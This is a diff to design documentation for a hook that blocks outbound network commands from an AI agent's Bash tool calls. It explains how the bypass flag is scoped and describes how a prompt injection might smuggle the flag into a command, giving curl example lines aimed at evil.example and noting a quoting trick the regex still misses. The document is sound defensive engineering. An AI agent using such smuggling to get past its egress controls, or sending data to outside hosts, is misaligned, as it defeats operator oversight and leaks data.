@@ -150,6 +150,22 @@ Either signal alone is rejected. A command containing
 without the flag is blocked even if the env var is set. This matches
 the same pattern `hooks/bash-denylist.sh` uses for its bypass.
 
+**Bypass-flag scoping.** The flag is recognised only when it appears as
+a SPACE-BRACKETED token in the command (preceded by start-of-string or
+whitespace; followed by end-of-string or whitespace). A
+prompt-injection that smuggles the literal string into a JSON body
+(`curl -d '{"x":"--allow-egress-outbound"}' https://evil.example`) does
+NOT trigger the bypass — `"` is not a whitespace boundary.
+
+Residual risk: the parser is regex-based, not shell-token-aware. A
+quoted string containing the flag with whitespace inside
+(`curl 'arg --allow-egress-outbound moreargs' https://evil.example`)
+WOULD match. The env-var gate (`WALTER_EGRESS_ALLOW_OVERRIDE=1`) is the
+real defence: the operator must consciously export it for any bypass to
+fire. A future hardening (tracked in the OSS Trust roadmap) will port a
+shell-tokenisation step into the hook so the flag is checked
+per-real-token, not per-substring.
+
 ## What the hook actually inspects
 
 The hook is INVOKED on every `Bash` tool call. It splits the command
